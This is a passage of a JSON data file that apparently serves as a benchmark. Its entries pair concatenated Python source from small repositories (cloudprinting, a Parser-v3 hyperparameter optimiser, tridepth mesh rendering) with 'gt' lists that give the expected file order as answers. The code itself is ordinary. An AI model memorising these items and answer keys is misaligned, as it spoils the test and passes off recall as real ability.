% (CLOUDPRINT_URL, printer), tokens)\n        sections = response.split('\"printers\": [')\n        lines = sections[1].split(',')\n        for line in lines:\n            if '\"id\"' in line:\n                printer_id = GetKeyValue(line)\n            elif '\"name\"' in line:\n                printer_name = GetKeyValue(line)\n                if printer_name == printer:\n                    logger.debug('Printer %s is registered', printer)\n                    if printer_id:\n                        return printer_id\n                    else:\n                        logger.error('Malformed api response.')\n                        return None\n\n    return None\n",
        "gt": [
            "'cloudprinting/cloudprinting/sample.py'",
            "'cloudprinting/cloudprinting/auth.py'",
            "'cloudprinting/cloudprinting/__init__.py'",
            "'cloudprinting/tests/__init__.py'"
        ]
    },
    {
        "files": [
            "'Parser-v3/hpo/evals/__init__.py'",
            "'Parser-v3/hpo/regress_hpo.py'",
            "'Parser-v3/main.py'",
            "'Parser-v3/hpo/ppp_hpo.py'",
            "'Parser-v3/hpo/__init__.py'",
            "'Parser-v3/hpo/base_hpo.py'"
        ],
        "content": "'Parser-v3/hpo/evals/__init__.py'\n:from hpo.evals.syndep_eval import evaluate_tokens\n\n'Parser-v3/hpo/regress_hpo.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom __future__ import absolute_import\nfrom __future__ import division\nfrom __future__ import print_function\nimport six\n\nimport os\nfrom collections import defaultdict as DefaultDict\n\nimport numpy as np\nimport numpy.linalg as la\nimport scipy.stats as sps\n\nfrom hpo.hps import *\nfrom hpo.ppp_hpo import PPPHPO\n\n\nclass RegressHPO(PPPHPO):\n\n\n\n  def __init__(self, *args, k=2.5, **kwargs):\n\n\n    super(RegressHPO, self).__init__(*args, **kwargs)\n    self._k = k\n    return\n\n\n  def rand(self, dims=None):\n\n\n    if dims is not None:\n      dims = set(dims)\n\n    hps = [hp for i, hp in enumerate(self) if (not hp.fixed) and ((dims is None) or (i in dims))]\n\n    mat = [np.ones([len(self.scores),1])] + [hp.as_matrix() for hp in hps]\n    mat = np.concatenate(mat, axis=1)\n    d = mat.shape[1]-1\n\n    interactmat = []\n    for i, vec1 in enumerate(mat.T):\n      for j, vec2 in enumerate(mat.T):\n        if i <= j:\n          interactmat.append((vec1*vec2)[:,None])\n\n    X = np.concatenate(interactmat, axis=1)\n    n, d2 = X.shape\n    I = np.eye(d2)\n    I[0,0] = 0\n    XTXinv = la.inv(X.T.dot(X) + .05*I)\n\n    mean = XTXinv.dot(X.T).dot(self.scores)\n    H = X.dot(XTXinv).dot(X.T)\n    epsilon_hat = self.scores - H.dot(self.scores)\n    dof = np.trace(np.eye(n) - H)\n    s_squared = epsilon_hat.dot(epsilon_hat) / dof\n    cov = s_squared * XTXinv\n    eigenvals, eigenvecs = la.eig(cov)\n    eigenvals = np.diag(np.abs(eigenvals))\n    eigenvecs = np.real(eigenvecs)\n    cov = eigenvecs.dot(eigenvals).dot(eigenvecs.T)\n    cov += .05**2*np.eye(len(cov))\n    if la.matrix_rank(cov) < len(cov):\n      print('WARNING: indefinite covariance matrix')\n      return {}\n\n    rand_dict = DefaultDict(dict)\n    vals = np.random.multivariate_normal(mean, cov)\n    bias = vals[0]\n    lins = vals[1:d+1]\n    bilins = np.zeros([d,d])\n    bilins[np.tril_indices(d)] = vals[d+1:]\n    bilins = .5*bilins + .5*bilins.T\n    eigenvals, eigenvecs = la.eig(bilins)\n    eigenvals = -np.diag(np.abs(eigenvals))\n    eigenvecs = np.real(eigenvecs)\n    bilins = eigenvecs.dot(eigenvals).dot(eigenvecs.T)\n    if la.matrix_rank(bilins) < len(bilins):\n      print('WARNING: indefinite interaction matrix')\n      return {}\n\n    rand_dict = DefaultDict(dict)\n    vals = np.clip(.5*la.inv(bilins).dot(lins), 0, 1)\n    i = 0\n    for hp in hps:\n      if isinstance(hp, NumericHyperparam):\n        rand_dict[hp.section][hp.option] = hp.denormalize(vals[i])\n        i += 1\n      else:\n        rand_dict[hp.section][hp.option] = hp.denormalize(vals[i:i+len(hp.bounds)-1])\n        i += len(hp.bounds)-1\n    return rand_dict\n\n\n  def __next__(self):\n\n\n    a = .5\n    b = 1.5\n    c = (2*self.k - len(self.scores)) / self.k\n    q = int( (-b + np.sqrt(b**2 - 4*a*c)) / (2*a) )\n    maximize = np.random.permutation(np.arange(len(self)))[:q]\n\n    rand_dict = super(RegressHPO, self).rand()\n    rank_dict, maximize = self.improve_rank(maximize)\n    for k, v in six.iteritems(rank_dict):\n      rand_dict[k].update(v)\n    max_dict = self.rand(maximize)\n    for k, v in six.iteritems(max_dict):\n      rand_dict[k].update(v)\n    return self.clean_dict(rand_dict)\n\n\n  @property\n  def k(self):\n    return self._k\n\n\nif __name__ == '__main__':\n\n\n  from hpo import evals\n\n\n  def eval_func(save_dir):\n    return evals.evaluate_tokens('data/CoNLL18/UD_English-EWT/en_ewt-ud-dev.conllu', os.path.join(save_dir, 'parsed/data/CoNLL18/UD_English-EWT/en_ewt-ud-dev.conllu'))\n\n  hpo = RegressHPO('hpo/config/test.csv', 'saves/English', eval_func)\n  rand_dict = next(hpo)\n  n = 0\n  for section in rand_dict:\n    for option in rand_dict[section]:\n      print('{}\\t{}\\t{}'.format(section, option, rand_dict[section][option]))\n      n += 1\n\n'Parser-v3/main.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom __future__ import absolute_import\nfrom __future__ import division\nfrom __future__ import print_function\n\nimport re\nimport os\nimport shutil\nimport sys\nimport time\nimport six\nfrom six.moves import input\nimport codecs\nfrom argparse import ArgumentParser\n\nfrom parser.config import Config\nimport parser\nfrom hpo import MVGHPO\n\nfrom hpo.evals.conll18_eval import evaluate\n\nsection_names = set()\nwith codecs.open(os.path.join('config', 'defaults.cfg')) as f:\n  section_regex = re.compile('\\[(.*)\\]')\n  for line in f:\n    match = section_regex.match(line)\n    if match:\n      section_names.add(match.group(1))\n\n\ndef resolve_network_dependencies(config, network_class, network_list, networks):\n  if network_list in ('None', ''):\n    return set(), networks\n  else:\n    network_list = network_list.split(':')\n    if network_class not in networks:\n      for _network_class in network_list:\n        config_file = os.path.join(config.get('DEFAULT', _network_class + '_dir'), 'config.cfg')\n        _config = Config(config_file=config_file)\n        _network_list = _config.get(_network_class, 'input_network_classes')\n        input_networks, networks = resolve_network_dependencies(_config, _network_class, _network_list, networks)\n        NetworkClass = getattr(parser, _network_class)\n        networks[_network_class] = NetworkClass(input_networks=input_networks, config=config)\n    return set(networks[_network_class] for _network_class in network_list), networks\n\n\n\n\n\ndef main():\n\n\n  argparser = ArgumentParser('Network')\n  argparser.add_argument('--save_metadir')\n  argparser.add_argument('--save_dir')\n  subparsers = argparser.add_subparsers()\n\n\n  train_parser = subparsers.add_parser('train')\n  train_parser.set_defaults(action=train)\n  train_parser.add_argument('network_class')\n  train_parser.add_argument('--force', action='store_true')\n  train_parser.add_argument('--noscreen', action='store_true')\n  train_parser.add_argument('--load', action='store_true')\n  train_parser.add_argument('--config_file', default='')\n  for section_name in section_names:\n    train_parser.add_argument('--'+section_name, nargs='+')\n\n  hpo_parser = subparsers.add_parser('hpo')\n  hpo_parser.set_defaults(action=hpo)\n  hpo_parser.add_argument('network_class')\n  hpo_parser.add_argument('--noscreen', action='store_true')\n  hpo_parser.add_argument('--config_file', default='')\n  hpo_parser.add_argument('--rand_file', default='hpo/config/default.csv')\n  hpo_parser.add_argument('--eval_metric', default='LAS')\n  for section_name in section_names:\n    hpo_parser.add_argument('--'+section_name, nargs='+')\n\n\n\n  run_parser = subparsers.add_parser('run')\n  run_parser.set_defaults(action=run)\n  run_parser.add_argument('conllu_files', nargs='+')\n  run_parser.add_argument('--output_dir')\n  run_parser.add_argument('--output_filename')\n  for section_name in section_names:\n    run_parser.add_argument('--'+section_name, nargs='+')\n\n\n  kwargs = vars(argparser.parse_args())\n  kwargs.pop('action')(**kwargs)\n  return\n\n\n\ndef train(**kwargs):\n\n\n\n  load = kwargs.pop('load')\n  force = kwargs.pop('force')\n  noscreen = kwargs.pop('noscreen')\n  save_dir = kwargs.pop('save_dir')\n  save_metadir = kwargs.pop('save_metadir')\n  network_class = kwargs.pop('network_class')\n  config_file = kwargs.pop('config_file')\n\n\n  kwargs = {key: value for key, value in six.iteritems(kwargs) if value is not None}\n  for section, values in six.iteritems(kwargs):\n    if section in section_names:\n      values = [value.split('=', 1) for value in values]\n      kwargs[section] = {opt: value for opt, value in values}\n  if 'DEFAULT' not in kwargs:\n    kwargs['DEFAULT'] = {}\n  kwargs['DEFAULT']['network_class'] = network_class\n\n\n  if save_metadir is not None:\n    kwargs['DEFAULT']['save_metadir'] = save_metadir\n  if save_dir is not None:\n    kwargs['DEFAULT']['save_dir'] = save_dir\n  config = Config(config_file=config_file, **kwargs)\n  save_dir = config.get('DEFAULT', 'save_dir')\n\n\n  if not load and os.path.isdir(save_dir):\n    if not force:\n      input_str = ''\n      while input_str not in ('y', 'n', 'yes', 'no'):\n        input_str = input('{} already exists. It will be deleted if you continue. Do you want to proceed? [Y/n] '.format(save_dir)).lower()\n      if input_str in ('n', 'no'):\n        print()\n        sys.exit(0)\n    elif noscreen:\n      sys.exit(0)\n    shutil.rmtree(save_dir)\n\n\n  if os.path.isdir(save_dir):\n    config_file = os.path.join(save_dir, 'config.cfg')\n  else:\n    os.makedirs(save_dir)\n    os.system('git rev-parse HEAD >> {}'.format(os.path.join(save_dir, 'HEAD')))\n\n  network_list = config.get(network_class, 'input_network_classes')\n  if not load:\n    with open(os.path.join(save_dir, 'config.cfg'), 'w') as f:\n      config.write(f)\n  input_networks, networks = resolve_network_dependencies(config, network_class, network_list, {})\n  NetworkClass = getattr(parser, network_class)\n  network = NetworkClass(input_networks=input_networks, config=config)\n  network.train(load=load, noscreen=noscreen)\n  return\n\n\n\ndef hpo(**kwargs):\n\n\n\n  noscreen = kwargs.pop('noscreen')\n  save_dir = kwargs.pop('save_dir')\n  save_metadir = kwargs.pop('save_metadir')\n  network_class = kwargs.pop('network_class')\n  config_file = kwargs.pop('config_file')\n  rand_file = kwargs.pop('rand_file')\n  eval_metric = kwargs.pop('eval_metric')\n\n\n  kwargs = {key: value for key, value in six.iteritems(kwargs) if value is not None}\n  for section, values in six.iteritems(kwargs):\n    if section in section_names:\n      values = [value.split('=', 1) for value in values]\n      kwargs[section] = {opt: value for opt, value in values}\n  if 'DEFAULT' not in kwargs:\n    kwargs['DEFAULT'] = {}\n  kwargs['DEFAULT']['network_class'] = network_class\n\n\n  if save_metadir is not None:\n    kwargs['DEFAULT']['save_metadir'] = save_metadir\n  if save_dir is None:\n    save_dir = Config(**kwargs).get('DEFAULT', 'save_dir')\n  if not os.path.exists(save_dir):\n    os.makedirs(save_dir)\n\n\n\n  lang = kwargs['DEFAULT']['LANG']\n  treebank = kwargs['DEFAULT']['TREEBANK']\n  lc = kwargs['DEFAULT']['LC']\n  tb = kwargs['DEFAULT']['TB']\n  base = 'data/CoNLL18/UD_{}-{}/{}_{}-ud-dev.conllu'.format(lang, treebank, lc, tb)\n  def eval_func(save_dir):\n    return evaluate(base, os.path.join(save_dir, 'parsed', base), eval_metric)\n\n  rargs = next(MVGHPO(rand_file, save_dir, eval_func=eval_func))\n  for section in rargs:\n    if section not in kwargs:\n      kwargs[section] = rargs[section]\n    else:\n      for option, value in six.iteritems(rargs[section]):\n        if option not in kwargs[section]:\n          kwargs[section][option] = value\n  save_dir = os.path.join(save_dir, str(int(time.time()*100000)))\n\n\n  if os.path.isdir(save_dir):\n    print()\n    sys.exit(0)\n  else:\n    os.mkdir(save_dir)\n    os.system('git rev-parse HEAD >> {}'.format(os.path.join(save_dir, 'HEAD')))\n\n  kwargs['DEFAULT']['save_dir'] = save_dir\n  config = Config(config_file=config_file, **kwargs)\n  network_list = config.get(network_class, 'input_network_classes')\n  with open(os.path.join(save_dir, 'config.cfg'), 'w') as f:\n    config.write(f)\n  input_networks, networks = resolve_network_dependencies(config, network_class, network_list, {})\n  NetworkClass = getattr(parser, network_class)\n  network = NetworkClass(input_networks=input_networks, config=config)\n  network.train(noscreen=noscreen)\n  return\n\n\ndef run(**kwargs):\n\n\n\n  save_dir = kwargs.pop('save_dir')\n  save_metadir = kwargs.pop('save_metadir')\n  conllu_files = kwargs.pop('conllu_files')\n  output_dir = kwargs.pop('output_dir')\n  output_filename = kwargs.pop('output_filename')\n\n\n  kwargs = {key: value for key, value in six.iteritems(kwargs) if value is not None}\n  for section, values in six.iteritems(kwargs):\n    if section in section_names:\n      values = [value.split('=', 1) for value in values]\n      kwargs[section] = {opt: value for opt, value in values}\n  if 'DEFAULT' not in kwargs:\n    kwargs['DEFAULT'] = {}\n\n\n  if save_metadir is not None:\n    kwargs['DEFAULT']['save_metadir'] = save_metadir\n  if save_dir is None:\n    save_dir = Config(**kwargs).get('DEFAULT', 'save_dir')\n  config_file = os.path.join(save_dir, 'config.cfg')\n  kwargs['DEFAULT']['save_dir'] = save_dir\n\n  config = Config(defaults_file='', config_file=config_file, **kwargs)\n  with open('debug.cfg', 'w') as f:\n    config.write(f)\n  network_class = config.get('DEFAULT', 'network_class')\n  network_list = config.get(network_class, 'input_network_classes')\n  input_networks, networks = resolve_network_dependencies(config, network_class, network_list, {})\n  NetworkClass = getattr(parser, network_class)\n  network = NetworkClass(input_networks=input_networks, config=config)\n  network.parse(conllu_files, output_dir=output_dir, output_filename=output_filename)\n  return\n\n\nif __name__ == '__main__':\n  main()\n\n'Parser-v3/hpo/ppp_hpo.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom __future__ import absolute_import\nfrom __future__ import division\nfrom __future__ import print_function\nimport six\n\nimport re\nimport os\n\nimport pickle as pkl\nimport codecs\nfrom collections import defaultdict as DefaultDict\n\ntry:\n  from ConfigParser import SafeConfigParser\nexcept ImportError:\n  from configparser import SafeConfigParser\n\nimport numpy as np\nimport numpy.linalg as la\nimport scipy.stats as sps\n\nfrom hpo.hps import *\nfrom hpo.base_hpo import BaseHPO\n\ndef pretty_plot(ax):\n  ax.grid(linestyle='--', axis='y')\n\n\nclass PPPHPO(BaseHPO):\n\n\n\n  def rand(self, dims=None):\n\n\n    if dims is not None:\n      dims = set(dims)\n\n    hps = [hp for i, hp in enumerate(self) if (not hp.fixed) and ((dims is None) or (i in dims))]\n    n = len(self.scores)\n\n    accepted = False\n    attempts = 0\n    best = None\n    best_p = 0\n    while not accepted:\n      rand_dict = super(PPPHPO, self).rand()\n      volume = 1\n      mass = set(six.moves.range(len(hps)))\n      d = sum([rand_dict[hp.section][hp.option] != np.nan for hp in hps])\n      for hp in hps:\n        if not accepted:\n          choice = rand_dict[hp.section][hp.option]\n          if choice != np.nan:\n            hp_volume, hp_mass = hp.PPP_volume(choice, d)\n            volume *= hp_volume\n            mass.intersection_update(hp_mass)\n            if len(mass) == 0:\n              accepted = True\n            for section, option in hp.copies:\n              rand_dict[section][option] = choice\n        else:\n          break\n      if not accepted:\n        lamda = (n+1)*volume\n        p = sps.poisson.sf(len(mass), lamda)\n        accepted = sps.bernoulli.rvs(p)\n        if not accepted:\n          attempts += 1\n          if p > best_p:\n            best = rand_dict\n            best_p = p\n          if attempts == 15:\n            accepted = True\n            rand_dict = best\n\n    return rand_dict\n\n\n  def __next__(self):\n\n\n    rand_dict = self.rand()\n    return self.clean_dict(rand_dict)\n\n\n  @property\n  def scores(self):\n    return self._scores\n\n\nif __name__ == '__main__':\n\n\n  from hpo import evals\n\n  def eval_func(save_dir):\n    return evals.evaluate_tokens('data/CoNLL18/UD_English-EWT/en_ewt-ud-dev.conllu', os.path.join(save_dir, 'parsed/data/CoNLL18/UD_English-EWT/en_ewt-ud-dev.conllu'))\n\n  hpo = PPPHPO('hpo/config/test.csv', 'saves/English', eval_func)\n  rand_dict = next(hpo)\n  n = 0\n  for section in rand_dict:\n    for option in rand_dict[section]:\n      print('{}\\t{}\\t{}'.format(section, option, rand_dict[section][option]))\n      n += 1\n\n'Parser-v3/hpo/__init__.py'\n:from __future__ import absolute_import\nfrom __future__ import division\nfrom __future__ import print_function\n\nfrom hpo.ppp_hpo import PPPHPO\nfrom hpo.mvg_hpo import MVGHPO\nfrom hpo.regress_hpo import RegressHPO\n\n'Parser-v3/hpo/base_hpo.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom __future__ import absolute_import\nfrom __future__ import division\nfrom __future__ import print_function\nimport six\n\nimport re\nimport os\n\nimport pickle as pkl\nimport codecs\nfrom collections import defaultdict as DefaultDict\n\ntry:\n  from ConfigParser import SafeConfigParser\nexcept ImportError:\n  from configparser import SafeConfigParser\n\nimport numpy as np\nimport numpy.linalg as la\nimport scipy.stats as sps\nimport pandas as pd\nimport matplotlib.pyplot as plt\n\nfrom hpo.hps import *\n\ndef pretty_plot(ax):\n  ax.grid(linestyle='--', axis='y')\n\n\nclass BaseHPO(list):\n\n\n\n  def __init__(self, rand_csv, meta_save_dir, eval_func):\n\n\n    super(BaseHPO, self).__init__()\n    rand_df = pd.read_csv(rand_csv)\n    name2hp = {}\n\n\n    for row in rand_df.itertuples():\n      if not row.bounds.startswith('%'):\n        if row.dtype == 'str':\n          hp = StringHyperparam(row.section, row.option, row.bounds)\n        elif row.dtype == 'float':\n          hp = FloatHyperparam(row.section, row.option, row.bounds)\n        elif row.dtype == 'log':\n          hp = LogHyperparam(row.section, row.option, row.bounds)\n        elif row.dtype == 'int':\n          hp = IntHyperparam(row.section, row.option, row.bounds)\n        elif row.dtype == 'bool':\n          hp = BoolHyperparam(row.section, row.option, row.bounds)\n        self.append(hp)\n        name2hp[hp.name] = hp\n\n\n    for row in rand_df.itertuples():\n      if row.bounds.startswith('%'):\n        copyrow = row\n        while copyrow.bounds.startswith('%'):\n          assert row.dtype == copyrow.dtype\n          match = re.match('%\\((\\w+):(\\w+)\\)', copyrow.bounds)\n          section = match.group(1)\n          option = match.group(2)\n          copyrow = rand_df.loc[(rand_df.section==section) & (rand_df.option==option)].iloc[0]\n        name2hp[section + ':' + option].add_copy(row.section, row.option)\n\n    indices = []\n    scores = []\n    for base_dir in os.listdir(meta_save_dir):\n      save_dir = os.path.join(meta_save_dir, base_dir)\n      if os.path.exists(os.path.join(save_dir, 'SUCCESS')):\n        try:\n          score = eval_func(save_dir)\n        except IndexError:\n          score = np.nan\n        if np.isfinite(score):\n          scores.append(score)\n          indices.append(int(base_dir))\n          config = SafeConfigParser()\n          config.read(os.path.join(save_dir, 'config.cfg'))\n          for hyperparam in self:\n            hyperparam.add_config_value(config)\n    scores = np.array(scores)\n    median = np.median(scores)\n    scores -= median\n    scores /= np.median(np.abs(scores))\n    to_remove = scores < -3\n    scores = scores[(1-to_remove).astype(bool)]\n    to_remove = np.where(to_remove)[0]\n    for index in to_remove[::-1]:\n      indices.pop(index)\n    order = np.argsort(indices)\n    self._scores = scores[order]\n    for hp in self:\n      hp.sort(order)\n    return\n\n\n  def rand(self):\n\n\n    rand_dict = DefaultDict(dict)\n    for hp in self:\n      rand_dict[hp.section][hp.option] = hp.rand()\n    return rand_dict\n\n\n  def improve_rank(self, dims=None):\n\n\n    hps = [hp for i, hp in enumerate(self) if (not hp.fixed) and ((dims is None) or (i in dims))]\n    d = len(hps)\n    discretes = [hp for hp in hps if isinstance(hp, (BoolHyperparam, StringHyperparam))]\n\n    discrete_values = {}\n    for discrete in discretes:\n      for i, bound in enumerate(discrete.bounds):\n        discrete_values[(discrete.name, bound)] = np.equal(discrete.values, i).astype(int)\n\n    discrete_list = []\n    for i, discrete1 in enumerate(discretes):\n      for bound1 in discrete1.bounds:\n        values1 = discrete_values[(discrete1.name, bound1)]\n        for j, discrete2 in enumerate(discretes):\n          if i != j:\n            for bound2 in discrete2.bounds:\n              values2 = discrete_values[(discrete2.name, bound2)]\n              discrete_list.append((np.dot(values1, values2), discrete1.name, bound1, discrete2.name, bound2))\n          elif i == j:\n            discrete_list.append((np.dot(values1, values1), discrete1.name, bound1, discrete1.name, bound1))\n        discrete_list.sort()\n\n    rand_dict = DefaultDict(dict)\n    hps_to_remove = set()\n    for count, name1, bound1, name2, bound2 in discrete_list:\n      section1, option1 = name1.split(':')\n      section2, option2 = name2.split(':')\n      if not (section1 in rand_dict and option1 in rand_dict[section1]) or\\\n         (section1 in rand_dict and option1 in rand_dict[section1] and bound1 == rand_dict[section1][option1]):\n        if not (section2 in rand_dict and option2 in rand_dict[section2]) or\\\n           (section2 in rand_dict and option2 in rand_dict[section2] and bound2 == rand_dict[section2][option2]):\n          if count <= d:\n            rand_dict[section1][option1] = bound1\n            rand_dict[section2][option2] = bound2\n            hps_to_remove.add((section1, option1))\n            hps_to_remove.add((section2, option2))\n    if dims is not None or hps_to_remove:\n      dims = [i for i, hp in enumerate(self) if ((i in dims) and ((hp.section, hp.option) not in hps_to_remove))]\n    return rand_dict, np.array(dims)\n\n\n  def clean_dict(self, rand_dict):\n\n\n    section = 'Network'\n    if section in rand_dict:\n      trigger = 'highway'\n      if trigger in rand_dict[section] and not rand_dict[section][trigger]:\n        if np.random.binomial(1, .5):\n          rand_dict[section]['highway_func'] = None\n        else:\n          rand_dict[section][trigger] = True\n      trigger = 'bidirectional'\n      if trigger in rand_dict[section] and not rand_dict[section][trigger]:\n        if np.random.binomial(1, .5):\n          rand_dict[section]['bilin'] = None\n        else:\n          rand_dict[section][trigger] = True\n      trigger = 'switch_optimizers'\n      if trigger in rand_dict[section] and not rand_dict[section][trigger]:\n        if np.random.binomial(1, .5):\n          rand_dict['AMSGradOptimizer']['learning_rate'] = None\n          rand_dict['AMSGradOptimizer']['decay_rate'] = None\n          rand_dict['AMSGradOptimizer']['clip'] = None\n          rand_dict['AMSGradOptimizer']['mu'] = None\n          rand_dict['AMSGradOptimizer']['nu'] = None\n          rand_dict['AMSGradOptimizer']['epsilon'] = None\n          rand_dict['AMSGradOptimizer']['gamma'] = None\n        else:\n          rand_dict[section][trigger] = True\n\n    section = 'TokenVocab'\n    if section in rand_dict:\n      if 'n_layers' in rand_dict[section] and rand_dict[section]['n_layers'] <= 0:\n        rand_dict[section]['n_layers'] = 0\n        rand_dict[section]['hidden_func'] = None\n        rand_dict[section]['hidden_size'] = None\n\n    for hp in self:\n      value = rand_dict[hp.section][hp.option]\n      for section, option in hp.copies:\n\n        rand_dict[section][option] = value\n    return rand_dict\n\n\n  def plots(self):\n\n\n    scores = -self.scores + np.max(self.scores)\n    k = sps.gamma.fit(scores, 2.5)\n    x = np.linspace(np.min(scores), np.max(scores))\n    dist = sps.gamma.pdf(x, *k)\n    x = -x+np.max(self.scores)\n\n    fig, ax = plt.subplots()\n    ax.set_title('HPO', y=1.08)\n    ax.set_ylabel('Normalized LAS')\n    ax.set_xlabel('Iteration')\n    ax.plot(self.scores)\n    axt = ax.twiny()\n    axt.plot(dist, x)\n    axt.fill_between([np.min(dist)] + list(dist) + [np.min(dist)], [np.max(x)] + list(x) + [np.min(x)], alpha=.25)\n    pretty_plot(ax)\n    fig.tight_layout()\n    plt.show()\n    for hp in self:\n      if not hp.fixed:\n        hp.plot(self.scores)\n    return\n\n\n  def __next__(self):\n\n\n    rand_dict = self.rand()\n    return self.clean_dict(rand_dict)\n\n\n  @property\n  def scores(self):\n    return self._scores\n\n\nif __name__ == '__main__':\n\n\n  from hpo import evals\n\n  base_dir = 'hpo/English'\n  base_dir = 'hpo/French'\n  def eval_func(save_dir):\n    base = 'data/CoNLL18/UD_English-EWT/en_ewt-ud-dev.conllu'\n    base = 'data/CoNLL18/UD_French-Spoken/fr_spoken-ud-dev.conllu'\n    return evals.evaluate_tokens(base, os.path.join(save_dir, 'parsed', base), force=False)\n\n  hpo = BaseHPO('hpo/config/test.csv', base_dir, eval_func)\n  rand_dict = next(hpo)\n  n = 0\n  for section in rand_dict:\n    for option in rand_dict[section]:\n      print('{}\\t{}\\t{}'.format(section, option, rand_dict[section][option]))\n      n += 1\n  hpo.plots()\n",
        "gt": [
            "'Parser-v3/hpo/evals/__init__.py'",
            "'Parser-v3/hpo/base_hpo.py'",
            "'Parser-v3/hpo/ppp_hpo.py'",
            "'Parser-v3/hpo/regress_hpo.py'",
            "'Parser-v3/hpo/__init__.py'",
            "'Parser-v3/main.py'"
        ]
    },
    {
        "files": [
            "'tridepth/tridepth/tridepth_3d.py'",
            "'tridepth/tridepth/__init__.py'",
            "'tridepth/models/networks/drn.py'",
            "'tridepth/models/networks/__init__.py'"
        ],
        "content": "'tridepth/tridepth/tridepth_3d.py'\n:import torch\nfrom copy import deepcopy\n\nfrom tridepth import BatchBaseMesh\nfrom tridepth.renderer import Renderer, vertices_to_faces, write_obj_with_texture\n\n\nclass TriDepth:\n    def __init__(self, base_imgs, cam_mat, mesh_list,\n                 render_size=None, device=torch.device('cuda')):\n\n        self.batchsize, _, self.height, self.width = base_imgs.shape\n        self.device = device\n\n\n        self.base_imgs = base_imgs\n        self.cam_mat = cam_mat\n\n\n        self.base_mesh = BatchBaseMesh(mesh_list, device=device)\n        self.base_edges = self.base_mesh.edgemaps\n\n\n        self.verts_2d = self.base_mesh.verts_2d\n        self.faces = self.base_mesh.faces\n        self.adj_edges = self.base_mesh.adj_edges\n        self.num_patch_list = self.base_mesh.faces.size_list\n\n\n        self.verts_3d = deepcopy(self.verts_2d)\n\n\n        self.render_size = (self.height, self.width) if render_size is None else render_size\n        self.render = Renderer(render_size=self.render_size)\n\n    def extarct_face_features(self, scene_feats, feat_type):\n\n        assert feat_type in [\"face_centroid\", \"face_pooling\"]\n\n        if feat_type == \"face_centroid\":\n            face_verts_2d = vertices_to_faces(self.verts_2d.tensor,\n                                              self.faces.tensor)\n            face_centroids = face_verts_2d.mean(dim=2)\n\n            from models.networks import feature_sampling\n            face_centroid_feats = feature_sampling(scene_feats, face_centroids)\n\n            return face_centroid_feats\n\n        elif feat_type == \"face_pooling\":\n\n            face_index_maps = self.render(self.verts_2d.tensor,\n                                          self.faces.tensor,\n                                          mode=\"face_index\")\n\n            from models.networks import FacePooling\n            face_pooling = FacePooling(pool_type=\"max\")\n            face_pooling_feats = face_pooling(scene_feats, face_index_maps, max_index=self.faces.max_size)\n\n            return face_pooling_feats\n\n    def assign_facedepths(self, face_depth_params):\n\n\n        face_verts_2d = vertices_to_faces(self.verts_2d.tensor, self.faces.tensor)\n        face_centroids = face_verts_2d.mean(dim=2, keepdim=True)\n        face_verts_coords = face_verts_2d - face_centroids\n        face_verts_zaxis = torch.ones_like(face_verts_coords[:, :, :, :1])\n        face_verts_coords = torch.cat((face_verts_coords, face_verts_zaxis), 3)\n\n\n        face_depth_params = face_depth_params.contiguous().view(-1, 1, 3)\n        face_verts_coords = face_verts_coords.view(-1, 3, 3).transpose(1, 2)\n\n\n        face_verts_depth = torch.bmm(face_depth_params, face_verts_coords)\n        face_verts_depth = face_verts_depth.view(self.batchsize, -1, 3, 1)\n\n\n        face_verts_depth = face_verts_depth.clamp(min=0.01, max=10.01)\n\n\n        verts_3d_tensor = torch.cat((face_verts_2d, face_verts_depth), 3).view(self.batchsize, -1, 3)\n        self.verts_3d.update_tensor(verts_3d_tensor)\n\n    def render_depths(self, render_size=None):\n\n        if render_size is None:\n            render_size = self.render_size\n\n\n        render_dic = self.render(self.verts_3d.tensor, self.faces.tensor,\n                                 render_size=render_size,\n                                 mode=[\"depth\", \"silhouette\"])\n\n        render_depths = render_dic[\"depth\"]\n\n        return render_depths\n\n    def _calculate_patch_distances(self, bth_verts, bth_adj_edges):\n\n        edge_size = bth_adj_edges.shape[0]\n        adj_edge_vert_depths = bth_verts[bth_adj_edges.view(-1).long(), 2].view(edge_size, 2, 2)\n        adj_edge_dist = torch.abs(adj_edge_vert_depths[:, 0] - adj_edge_vert_depths[:, 1]).mean(dim=1)\n        return adj_edge_dist\n\n    def _connect_patches(self, bth_faces, bth_adj_edges, mask=None):\n\n        if mask is not None:\n            assert mask.shape[0] == bth_adj_edges.shape[0]\n            bth_adj_edges = bth_adj_edges[mask]\n\n        connected_faces = bth_faces.clone()\n        for l in range(bth_adj_edges.shape[0]):\n            e1, e2 = bth_adj_edges[l]\n\n\n            connected_faces = torch.where(connected_faces == e1[0], e2[0], connected_faces)\n            connected_faces = torch.where(connected_faces == e1[1], e2[1], connected_faces)\n\n\n            if l < len(bth_adj_edges) - 1:\n                bth_adj_edges[l + 1:] = torch.where(bth_adj_edges[l + 1:] == e1[0], e2[0], bth_adj_edges[l + 1:])\n                bth_adj_edges[l + 1:] = torch.where(bth_adj_edges[l + 1:] == e1[1], e2[1], bth_adj_edges[l + 1:])\n\n        return connected_faces\n\n    def save_into_obj(self, filename, b_idx=0, texture=\"img\", connect_th=0.1):\n\n        assert texture in [\"img\", \"edge\"]\n\n\n        if texture == \"img\":\n            max_val = self.base_imgs[b_idx].max()\n            min_val = self.base_imgs[b_idx].min()\n            textures = (self.base_imgs[b_idx] - min_val) / (max_val - min_val)\n            textures = textures.permute(1, 2, 0).detach()\n        elif texture == \"edge\":\n            max_val = self.base_edges[b_idx].max()\n            min_val = self.base_edges[b_idx].min()\n            textures = (self.base_edges[b_idx] - min_val) / (max_val - min_val)\n            textures = textures[0].detach()\n\n\n        bth_adj_edges = self.adj_edges.raw_data(b_idx)\n        bth_verts = self.verts_3d.raw_data(b_idx)\n        bth_faces = self.faces.raw_data(b_idx)\n\n\n        if connect_th is not None:\n            connect_mask = self._calculate_patch_distances(bth_verts, bth_adj_edges) < connect_th\n            connected_faces = self._connect_patches(bth_faces, bth_adj_edges, mask=connect_mask)\n            faces = connected_faces.detach().cpu().numpy()\n        else:\n            faces = self.base_mesh.mesh_list[b_idx].faces\n\n\n        device = self.verts_3d.tensor.device\n        intrinsics = self.cam_mat(img_size=self.render_size,\n                                  t_tensor=True,\n                                  batch_size=self.batchsize).to(device)\n        verts_3d_cam = self.render.convert_depthmap_to_cam(self.verts_3d.tensor, intrinsics, self.render_size)\n\n\n        np_verts_3d_cam = 